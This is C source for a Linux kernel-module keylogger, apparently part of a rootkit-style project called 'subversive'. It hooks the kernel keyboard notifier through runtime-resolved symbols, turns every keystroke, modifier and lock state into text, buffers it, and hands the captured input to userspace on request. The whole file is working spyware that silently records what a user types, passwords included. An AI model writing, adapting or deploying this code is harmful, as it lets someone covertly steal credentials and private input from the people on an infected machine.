#include <linux/keyboard.h>
#include <linux/notifier.h>

#include <subversive/config.h>
#include <subversive/keylogger.h>
#include <subversive/libc.h>

/* keys buffer */
static char *trans;
/* string length (not including '\0') */
static unsigned int trans_size;

/*
 * key symbol maps
 * the ascii table could be enlarged to support an extended character set
 */
static char *ascii[128] = {
	NO_EFCT, "<SOH>", "<STX>", "<ETX>", "<EOT>", "<ENQ>", "<ACK>", "<BEL>",
	"<BS>",  "<TAB>", "<LF>",  "<VT>",  "<FF>",  "<CR>",  "<SO>",  "<SI>",
	"<DLE>", "<DC1>", "<DC2>", "<DC3>", "<DC4>", "<NAK>", "<SYN>", "<ETB>",
	"<CAN>", "<EM>",  "<SUB>", "<ESC>", "<FS>",  "<GS>",  "<RS>",  "<US>",
	" ","!","\"","#","$","%","&","'","(",")","*","+",",", "-",".","/",
	"0","1","2", "3","4","5","6","7","8","9",":",";","<", "=",">","?",
	"@","A","B", "C","D","E","F","G","H","I","J","K","L", "M","N","O",
	"P","Q","R", "S","T","U","V","W","X","Y","Z","[","\\","]","^","_",
	"`","a","b", "c","d","e","f","g","h","i","j","k","l", "m","n","o",
	"p","q","r", "s","t","u","v","w","x","y","z","{","|", "}","~","<DEL>"
};

static char *fncs[16] = {
			UNKNOWN, UNKNOWN, UNKNOWN, UNKNOWN,
			HOME, INSERT, DELETE, END,
			PAGE_UP, PAGE_DN, UNKNOWN, UNKNOWN,
			UNKNOWN, PAU_BRK, UNKNOWN, UNKNOWN
};

static char *locks[16] = {
			MENU, ENTER, UNKNOWN, UNKNOWN,
			UNKNOWN, UNKNOWN, UNKNOWN, UNKNOWN,
			"<num _>", "<scl _>", UNKNOWN, UNKNOWN,
			UNKNOWN, UNKNOWN, UNKNOWN, UNKNOWN
};

static char *locked_nums[17] = {
			"0", "1", "2", "3",
			"4", "5", "6", "7",
			"8", "9", "+", "-",
			"*", "/", ENTER, UNKNOWN,
			"."
};

static char *unlocked_nums[17] = {
				INSERT, END, ARW_DN, PAGE_DN,
				ARW_LT, NO_EFCT, ARW_RT, HOME,
				ARW_UP, PAGE_UP, "+", "-",
				"*", "/", ENTER, UNKNOWN,
				DELETE
};

static char *arws[4] = { ARW_DN, ARW_LT, ARW_RT, ARW_UP };
static char *mods[4] = { "<shift _>", UNKNOWN, "<ctrl _>", "<alt _>" };

/*
 * Translates "normal" keys--that is, key's that produce ascii.
 * Index into array to get string representations of ascii characters on
 * key-press events.  For printable characters, that's just the character
 * itself; for control characters, that's an abreviation of their function.
 * Key-release events are ignored.
 *
 * NOTE: For printable ascii characters I could have just returned the key
 *      symbol value cast as a character.  However, I opted for a large table
 *      because it can also handle control values, and is more easily modified
 *      to support an extended ascii character set.
 */
static unsigned int ksym_std(struct keyboard_notifier_param *ks, char *buf)
{
	unsigned char val  = ks->value & 0x00ff;

	/* ignore key-release events */
	if (!ks->down)
		return 0;

	/* otherwise return string representation */
	return subversive_strlcat(buf, ascii[val], KEYLOGGER_BUFLEN);
}

/*
 * Translates f-keys and the keys typically above the arrow buttons.
 * If the high nybble of the keyboard_notifier_param's value field (ks->value)
 * is zero'd, we're dealing with an f-key; otherwise we're dealing with one of
 * the keys above the arrow pad.  F-keys are handled by inserting the low nybble
 * of the value field, incremented by 1, into a predefined string. The low
 * nybble+1 is the f-key's number. For example:
 *
 *                          +-----------------type
 *                          |      +----------val
 *                          |      |
 *  ks->value = 0xf103 = | 0xf1 | 0x03 |
 *                                 |
 *                +----------------+
 *                |
 *  buf = "<f" + val+1 + ">" = "<f4>"
 *
 * Non-f-keys are handled by using the low nybble of the value field to index
 * into an array of string represenations.
 *
 * NOTE: f-keys are often handled strangely, so logging results may vary.
 */
static unsigned int ksym_fnc(struct keyboard_notifier_param *ks, char *buf)
{
	unsigned int len;
	unsigned char val  = ks->value & 0x00ff;
	char temp[6];

	/* ignore key-release events */
	if (!ks->down)
		return 0;

	/* non-f-keys when the high nybble isn't zero'd */
	if (val & 0xf0) {
		len = subversive_strlcat(buf, fncs[val & 0x0f], KEYLOGGER_BUFLEN);
	} else { /* f-key otherwise */
		subversive_snprintf(temp, 6, "%s%d>", F_KEYS, ++val);
		len = subversive_strlcat(buf, temp, KEYLOGGER_BUFLEN);
	}

	return len;
}

/*
 * Translate keysymbols with a value of 0x02.
 * The num and scroll lock keys are included here, hence the name of the method.
 * All translation is done by indexing into a character string array, as per
 * usual.  For num and scroll lock though, a status indicator is inserted into
 * the resultant string.
 */
static unsigned int ksym_loc(struct keyboard_notifier_param *ks, char *buf)
{
	unsigned int len;
	unsigned char val  = ks->value & 0x00ff;
	int n_lock = ks->ledstate & NLOCK_MASK;
	int s_lock = ks->ledstate & SLOCK_MASK;

	/* just in case */
	if (val > 16)
		return 0;

	/* ignore key-press events */
	if (ks->down)
		return 0;

	/* translate key symbol */
	len = subversive_strlcat(buf, locks[val], KEYLOGGER_BUFLEN);

	/* handle status indicator for num and scroll lock, respectively */
	if (val == 0x08)
		buf[len - 2] = n_lock ? ENABLE : DISABLE;
	else if (val == 0x09)
		buf[len - 2] = s_lock ? ENABLE : DISABLE;

	return len;
}

/*
 * Translates number pad keys.
 * The ledstate field of the keyboard_notifier_param must be parsed to determine
 * whether numlock is enabled or not.  See header description for more info on
 * how ledstate is handled.
 */
static unsigned int ksym_num(struct keyboard_notifier_param *ks, char *buf)
{
	unsigned int len;
	unsigned char val  = ks->value & 0x00ff;
	int n_lock = ks->ledstate & NLOCK_MASK;

	/* just in case */
	if (val > 16)
		return 0;

	/* ignore key-release events */
	if (!ks->down)
		return 0;

	/* values depend on the state of numlock */
	if (n_lock)
		len = subversive_strlcat(buf, locked_nums[val], KEYLOGGER_BUFLEN);
	else if (!n_lock)
		len = subversive_strlcat(buf, unlocked_nums[val], KEYLOGGER_BUFLEN);

	return len;
}

/*
 * Translates arrow pad keys.
 * Index into the arrows character string array to obtain the appropriate string
 * for a given arrow key.  Key release events are ignored.
 */
static unsigned int ksym_arw(struct keyboard_notifier_param *ks, char *buf)
{
	unsigned char val  = ks->value & 0x00ff;

	/* just in case */
	if (val > 3)
		return 0;

	/* ignore key-release events */
	if (!ks->down)
		return 0;

	/* translate arrow key to string */
	return subversive_strlcat(buf, arws[val], KEYLOGGER_BUFLEN);
}

/*
 * Translates normal modifier keys.
 * Appends the appropriate string to the output buffer on both key-press and
 * key-release events.  An event-specific character is inserted into the string
 * to indicate key pressure (p for press, r for release events).
 *
 * NOTE: The alt and meta keys both produce the same key symbol, and are
 *      therefore indistinguishable at this point in the line discipline.  We
 *      could have captured keycodes instead (each key has a completely unique
 *      keycode), but the translation process would have been more complex.
 */
static unsigned int ksym_mod(struct keyboard_notifier_param *ks, char *buf)
{
	unsigned int len;
	unsigned char val  = ks->value & 0x00ff;

	/* just in case */
	if (val > 3)
		return 0;

	/* translate mod key to string */
	len = subversive_strlcat(buf, mods[val], KEYLOGGER_BUFLEN);

	/* add pressure indicator */
	buf[len - 2] = ks->down ? PRESS : RELEASE;

	return len;
}

/*
 * Translates the capslock key.
 * Appends the appropriate string to the output buffer on key-release events.
 * (Here we ignore key-press events because the caps lock state doesn't change
 * until after the caps lock key is pressed.)  An event-specific character is
 * inserted into the string to indicate the NEW capslock state (e for enabled,
 * d for disabled).
 */
static unsigned int ksym_cap(struct keyboard_notifier_param *ks, char *buf)
{
	unsigned int len;
	unsigned char val  = ks->value & 0x00ff;
	int c_lock = ks->shift & CLOCK_MASK;

	/* ignore key-press events */
	if (ks->down)
		return 0;

	if (val == 0x06) {
		/* translate mod key to string */
		len = subversive_strlcat(buf, CAPLOCK, KEYLOGGER_BUFLEN);

		/* add lock status indicator */
		buf[len - 2] = c_lock ? ENABLE : DISABLE;
	} else {
		len = subversive_strlcat(buf, UNKNOWN, KEYLOGGER_BUFLEN);
	}

	return len;
}

/*
 * Wrapper for key symbol translation fucntions.
 * Parses type and selects the appropriate translation function.
 *
 * Parameters:
 *  ks_param - keystroke data
 *  buf      - output buffer
 *
 * Returns:
 *  ni nada
 */
unsigned int xlate_keysym(struct keyboard_notifier_param *ks_param, char *buf)
{
	unsigned int len = 0;
	unsigned char type = ks_param->value >> 8;

	/* high nybble doesn't seem to be useful */
	type &= 0x0f;

	/* select appropriate translation function */
	switch (type) {
	case 0x0 :
		len = ksym_std(ks_param, buf);
		break;
	case 0x1 :
		len = ksym_fnc(ks_param, buf);
		break;
	case 0x2 :
		len = ksym_loc(ks_param, buf);
		break;
	case 0x3 :
		len = ksym_num(ks_param, buf);
		break;
	case 0x4 :
		break;
	case 0x5 :
		break;
	case 0x6 :
		len = ksym_arw(ks_param, buf);
		break;
	case 0x7 :
		len = ksym_mod(ks_param, buf);
		break;
	case 0x8 :
		break;
	case 0x9 :
		break;
	case 0xa :
		len = ksym_cap(ks_param, buf);
		break;
	case 0xb :
		len = ksym_std(ks_param, buf);
		break;
	case 0xc :
		break;
	case 0xd :
		break;
	case 0xe :
		break;
	case 0xf :
		break;
	}

	return len;
}

static int
keylogger_notifiy(struct notifier_block *nb, unsigned long kcode, void *p)
{
	unsigned int len;
	struct keyboard_notifier_param *param = p;
	
	if (kcode == KBD_KEYSYM) {
		len = xlate_keysym(param, trans);
		if (len > 0) {
			if (len >= KEYLOGGER_BUFLEN)
				trans_size = KEYLOGGER_BUFLEN - 1;
			else
				trans_size = len;
		}
	}

	return NOTIFY_OK;
}

static struct notifier_block keylogger_notifier_block = {
	.notifier_call = &keylogger_notifiy,
};

/*
 * keylogger APIs: racy :-)
 */

/*
 * keylogger_buffer_get: copy keylogger buffer to
 * userspace buffer @dst of size @size
 * return length copied
 */
long keylogger_buffer_get(char *dst, unsigned int size)
{
	int err;
	long ret;

	if (size >= trans_size) {
		size = trans_size;
		ret = trans_size;
	} else if (size < trans_size) {
		ret = size;
	}

	pr_debug("%s: size=%u ret=%ld trans_size=%u\n",
			__func__, size, ret, trans_size);

	if (size) {
		err = ksyms._copy_to_user(dst, trans, size);
		if (err) {
			pr_debug("%s: copy_to_user failed\n", __func__);
			return -1;
		}
	}

	/* reset buffer */
	trans[0] = 0;
	trans_size = 0;

	return ret;
}

int keylogger_init(void)
{
	if (!ksyms.register_keyboard_notifier) {
		pr_debug("%s: register_keyboard_notifier not found\n", __func__);
		return -1;
	}

	trans = subversive_vmalloc(KEYLOGGER_BUFLEN);
	if (!trans) {
		pr_debug("%s: vmalloc failed\n", __func__);
		return -1;
	}

	memset(trans, 0, KEYLOGGER_BUFLEN);
	ksyms.register_keyboard_notifier(&keylogger_notifier_block);

	return 0;
}

int keylogger_exit(void)
{
	if (trans)
		subversive_vfree(trans);
	else
		return -1; /* notifier not registered */

	if (!ksyms.unregister_keyboard_notifier) {
		pr_debug("%s: register_keyboard_notifier not found\n", __func__);
		return -1;
	}

	ksyms.unregister_keyboard_notifier(&keylogger_notifier_block);

	return 0;
}
